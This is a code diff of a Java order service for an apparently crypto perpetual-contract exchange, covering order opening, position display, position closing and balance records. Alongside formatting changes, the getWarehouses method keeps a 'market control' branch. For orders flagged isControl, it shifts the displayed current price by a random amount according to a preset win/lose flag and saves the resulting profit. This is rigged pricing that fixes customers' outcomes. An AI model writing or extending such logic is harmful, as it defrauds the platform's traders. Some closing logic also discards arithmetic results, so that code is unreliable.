@@ -52,7 +52,7 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
                 5000, 50, 100);
         if (lock_coin) {
             Lever lever = leverMapper.selectById(perpetualContractOrder.getLeverId());
-            if (lever==null){
+            if (lever == null) {
                 throw new BusinessException("当前传递杠杆Id，数据库不存在");
             }
             // 资金扣除
@@ -64,7 +64,7 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
             perpetualContractOrder.setLeverNum(lever.getLever());
             perpetualContractOrder.setProfit(new BigDecimal(0.00));
 
-            PerpetualContractOrder perpetual=new PerpetualContractOrder(
+            PerpetualContractOrder perpetual = new PerpetualContractOrder(
                     perpetualContractOrder.getMemberId(),
                     perpetualContractOrder.getPairsName(),
                     perpetualContractOrder.getKPrice(),
@@ -93,19 +93,19 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
     }
 
     @Override
-    public Map<Object,Object>  getContractOrder(String id) {
+    public Map<Object, Object> getContractOrder(String id) {
         DecimalFormat df = new DecimalFormat("0.00%");
         QueryWrapper<PerpetualContractOrder> wrapperMain = new QueryWrapper<PerpetualContractOrder>();
         wrapperMain.eq("id", id);
-        PerpetualContractOrder perpetual=perpetualContractOrderMapper.selectOne(wrapperMain);
-        if (perpetual==null){
+        PerpetualContractOrder perpetual = perpetualContractOrderMapper.selectOne(wrapperMain);
+        if (perpetual == null) {
             throw new BusinessException("请检查订单id是否正确");
         }
-        Map<Object,Object> map = JSON.parseObject(JSON.toJSONString(perpetual), Map.class);
-        if (perpetual.getProfit().compareTo(new BigDecimal(0.00))==1) {
-            map.put("profitUp",df.format(perpetual.getProfit().divide(perpetual.getAmount())));
+        Map<Object, Object> map = JSON.parseObject(JSON.toJSONString(perpetual), Map.class);
+        if (perpetual.getProfit().compareTo(new BigDecimal(0.00)) == 1) {
+            map.put("profitUp", df.format(perpetual.getProfit().divide(perpetual.getAmount())));
         } else {
-            map.put("profitUp","0.00");
+            map.put("profitUp", "0.00");
         }
         return map;
     }
@@ -121,21 +121,21 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
     }
 
     @Override
-    public List<Object> getWarehouses(String memberId, String pairsName,String price) {
-        List<Object> list=new ArrayList<>();
+    public List<Object> getWarehouses(String memberId, String pairsName, String price) {
+        List<Object> list = new ArrayList<>();
         DecimalFormat df = new DecimalFormat("0.00%");
+        double random = Math.random() * 100;
         QueryWrapper<PerpetualContractOrder> wrapperMain = new QueryWrapper<PerpetualContractOrder>();
         wrapperMain.eq("pairs_name", pairsName);
         wrapperMain.eq("order_state", "POSITIONS"); //状态为持仓
         wrapperMain.eq("member_id", memberId);
         List<PerpetualContractOrder> balanceMain = perpetualContractOrderMapper.selectList(wrapperMain);
-        for (PerpetualContractOrder o:balanceMain) {
-            double random = Math.random()*100;
+        for (PerpetualContractOrder o : balanceMain) {
             JSONObject josnInfo = new JSONObject();
-            BigDecimal nowPrice=new BigDecimal(price);
+            BigDecimal nowPrice = new BigDecimal(price);
             //傻逼操作 控盘
-            BigDecimal  pri = new BigDecimal(random);
-            if(o.getIsControl() == 1) {//控盘
+            BigDecimal pri = new BigDecimal(random);
+            if (o.getIsControl() == 1) {//控盘
                 if (o.getIsWin() == 0) {//输
                     nowPrice = o.getProfit().add(nowPrice.add(pri));
                 } else {
@@ -144,24 +144,24 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
                 }
             }
             //计算收益
-            BigDecimal profit=o.getKPrice().subtract(nowPrice);
+            BigDecimal profit = o.getKPrice().subtract(nowPrice);
             o.setBPrice(nowPrice);
             o.setProfit(profit);
             perpetualContractOrderMapper.updateById(o);
 
-            josnInfo.put("price",o.getKPrice()); //成本价
-            josnInfo.put("time",o.getCreateTime());//创建时间
-//            if (o.getProfit().compareTo(new BigDecimal(0.00))==1) {
-//                josnInfo.put("profitUp", df.format(o.getProfit().divide(o.getAmount())));//收益率
-//            }else {
-//                //应该随机
-//                josnInfo.put("profitUp","0.00%");
-//            }
-            BigDecimal profitUp = o.getProfit().divide(o.getAmount());
-            josnInfo.put("profitUp", df.format(profitUp));//收益率
-            josnInfo.put("amount",o.getAmount());
-            josnInfo.put("id",o.getId());
-            josnInfo.put("tradeType",o.getTradeType());
+            josnInfo.put("price", o.getKPrice()); //成本价
+            josnInfo.put("time", o.getCreateTime());//创建时间
+            if (o.getProfit().compareTo(new BigDecimal(0.00)) == 1) {
+                josnInfo.put("profitUp", df.format(o.getProfit().divide(o.getAmount())));//收益率
+            } else {
+                //应该随机
+                josnInfo.put("profitUp", "0.00%");
+            }
+//            BigDecimal profitUp = o.getProfit().divide(o.getAmount());
+//            josnInfo.put("profitUp", df.format(profitUp));//收益率
+            josnInfo.put("amount", o.getAmount());
+            josnInfo.put("id", o.getId());
+            josnInfo.put("tradeType", o.getTradeType());
 
             list.add(josnInfo);
         }
@@ -180,48 +180,49 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
         wrapperMain.eq("order_state", "POSITIONS"); //状态为持仓
         wrapperMain.eq("member_id", perpetualContractOrder.getMemberId());
         List<PerpetualContractOrder> balanceMain = perpetualContractOrderMapper.selectList(wrapperMain);
-        if (balanceMain==null){
+        if (balanceMain == null) {
             throw new BusinessException("没有持仓手数可用");
         }
-        List<PerpetualContractOrder> b=balanceMain.stream().filter(a -> a.getTradeType().equals(perpetualContractOrder.getTradeType())).collect(Collectors.toList());
-        if (new BigDecimal(b.size()).compareTo(perpetualContractOrder.getContractHands())==-1){
+        List<PerpetualContractOrder> b = balanceMain.stream().filter(a -> a.getTradeType().equals(perpetualContractOrder.getTradeType())).collect(Collectors.toList());
+        if (perpetualContractOrder.getContractHands() == null ||
+                new BigDecimal(b.size()).compareTo(perpetualContractOrder.getContractHands()) == -1) {
             throw new BusinessException("持仓手数小于要扣除手数");
         }
-        for (PerpetualContractOrder per:b) {
-            if (per.getContractHands().compareTo(new BigDecimal(0))==0){ //已全部扣除
+        for (PerpetualContractOrder per : b) {
+            if (per.getContractHands().compareTo(new BigDecimal(0)) == 0) { //已全部扣除
                 break;
             }
-            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands())==0){ //等于要扣除的手数
+            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands()) == 0) { //等于要扣除的手数
                 //退回金额
                 perpetualContractOrder.getContractHands().subtract(per.getContractHands());//减少手数
                 //修改状态为已平仓 ClLOSEOUT
-                BigDecimal margin= perpetualContractOrder.getAmount().add(per.getProfit());//扣除金额
-                updateBalance(perpetualContractOrder,margin);
+                BigDecimal margin = perpetualContractOrder.getAmount().add(per.getProfit());//扣除金额
+                updateBalance(perpetualContractOrder, margin);
                 per.setOrderState("ClLOSEOUT");
                 per.setBPrice(perpetualContractOrder.getKPrice());//结束价格
                 per.setUsableControlHands(new BigDecimal(0));
                 perpetualContractOrderMapper.updateById(per);
                 break;
             }
-            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands())==1){ //大于要扣除的手数
+            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands()) == 1) { //大于要扣除的手数
 
                 //退回金额
                 perpetualContractOrder.getContractHands().subtract(per.getContractHands());//减少手数
                 //修改状态为已平仓 ClLOSEOUT
-                BigDecimal a=per.getContractHands().multiply(new BigDecimal(1000));//要减少的金额
-                updateBalance(perpetualContractOrder,a);//还有持仓手数 不减少 收益
+                BigDecimal a = per.getContractHands().multiply(new BigDecimal(1000));//要减少的金额
+                updateBalance(perpetualContractOrder, a);//还有持仓手数 不减少 收益
 
                 per.setBPrice(perpetualContractOrder.getKPrice());
                 per.setUsableControlHands(perpetualContractOrder.getContractHands().subtract(per.getUsableControlHands()));
                 perpetualContractOrderMapper.updateById(per);
                 break;
             }
-            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands())==-1){ //小于要扣除的手数
+            if (per.getContractHands().compareTo(perpetualContractOrder.getContractHands()) == -1) { //小于要扣除的手数
                 //退回金额
                 perpetualContractOrder.getContractHands().subtract(per.getContractHands());//减少手数
                 //修改状态为已平仓 ClLOSEOUT
-                BigDecimal margin= perpetualContractOrder.getAmount().add(per.getProfit());//扣除金额
-                updateBalance(perpetualContractOrder,margin);//还有持仓手数 不减少 收益
+                BigDecimal margin = perpetualContractOrder.getAmount().add(per.getProfit());//扣除金额
+                updateBalance(perpetualContractOrder, margin);//还有持仓手数 不减少 收益
                 per.setOrderState("ClLOSEOUT");
                 per.setBPrice(perpetualContractOrder.getKPrice());
                 per.setUsableControlHands(new BigDecimal(0));
@@ -242,11 +243,11 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
             wrapperMain.eq("currency", perpetualContractOrderVO.getCoinName());
             wrapperMain.eq("user_id", perpetualContractOrderVO.getMemberId());
             Balance balanceMain = balanceMapper.selectOne(wrapperMain);
-            if (balanceMain==null){
+            if (balanceMain == null) {
                 throw new BusinessException(perpetualContractOrderVO.getCoinName().concat("不足"));
             }
             //要扣除的价格
-            BigDecimal deductPrice=perpetualContractOrderVO.getMargin().add(perpetualContractOrderVO.getMatchFee());
+            BigDecimal deductPrice = perpetualContractOrderVO.getMargin().add(perpetualContractOrderVO.getMatchFee());
             try {
                 if (balanceMain.getAssetsBalance().compareTo(deductPrice) == -1) {
                     throw new BusinessException(AjaxResultEnum.INSUFFICIENT_MARGIN_BALANCE.getMessage());
@@ -266,10 +267,10 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
                     CacheConstants.MEMBER_BALANCE_COIN_KEY + CacheConstants.SPLIT + balanceMain.getUserId());
 
             // 资金减少记录
-            saveBalanceRecord(perpetualContractOrderVO.getMemberId(),perpetualContractOrderVO.getCoinName(),10,1,assetsBalance,balanceMain.getAssetsBalance(),subtract);
+            saveBalanceRecord(perpetualContractOrderVO.getMemberId(), perpetualContractOrderVO.getCoinName(), 10, 1, assetsBalance, balanceMain.getAssetsBalance(), subtract);
 
             // 冻结日志
-            saveBalanceRecord(perpetualContractOrderVO.getMemberId(),perpetualContractOrderVO.getCoinName(),13,2,assetsBlockedBalance,balanceMain.getAssetsBlockedBalance(),perpetualContractOrderVO.getMargin());
+            saveBalanceRecord(perpetualContractOrderVO.getMemberId(), perpetualContractOrderVO.getCoinName(), 13, 2, assetsBlockedBalance, balanceMain.getAssetsBlockedBalance(), perpetualContractOrderVO.getMargin());
 
         } else {
             openBalance(perpetualContractOrderVO);
@@ -280,9 +281,10 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
     }
 
     /**
-     *  退回金额
+     * 退回金额
+     *
      * @param contractOrder
-     * @param margin  要退回的金额
+     * @param margin        要退回的金额
      */
     private void updateBalance(PerpetualContractOrderVO contractOrder, BigDecimal margin) {
         // 要回到账户余额 = 金额 + 收益
@@ -308,16 +310,16 @@ public class PerpetualContractOrderServiceImpl extends ServiceImpl<PerpetualCont
                     CacheConstants.MEMBER_BALANCE_COIN_KEY + CacheConstants.SPLIT + balanceActive.getUserId());
 
             // 平仓可用增加
-            saveBalanceRecord(contractOrder.getMemberId(),contractOrder.getCoinName(),11,2,assetsBalance,balanceActive.getAssetsBalance(),balance);
+            saveBalanceRecord(contractOrder.getMemberId(), contractOrder.getCoinName(), 11, 2, assetsBalance, balanceActive.getAssetsBalance(), balance);
 
             // 平仓冻结减少
-            saveBalanceRecord(contractOrder.getMemberId(),contractOrder.getCoinName(),12,1,assetsBlockedBalance,balanceActive.getAssetsBlockedBalance(),margin);
+            saveBalanceRecord(contractOrder.getMemberId(), contractOrder.getCoinName(), 12, 1, assetsBlockedBalance, balanceActive.getAssetsBlockedBalance(), margin);
         } else {
             updateBalance(contractOrder, margin);
         }
     }
 
-    private void saveBalanceRecord(String memberId,String currency,Integer balanceType,Integer fundsType,BigDecimal balanceBefore, BigDecimal balanceBack,BigDecimal balanceDifference){
+    private void saveBalanceRecord(String memberId, String currency, Integer balanceType, Integer fundsType, BigDecimal balanceBefore, BigDecimal balanceBack, BigDecimal balanceDifference) {
         BalanceRecord balanceRecord = new BalanceRecord();
         balanceRecord.setMemberId(memberId);
         balanceRecord.setCurrency(currency);
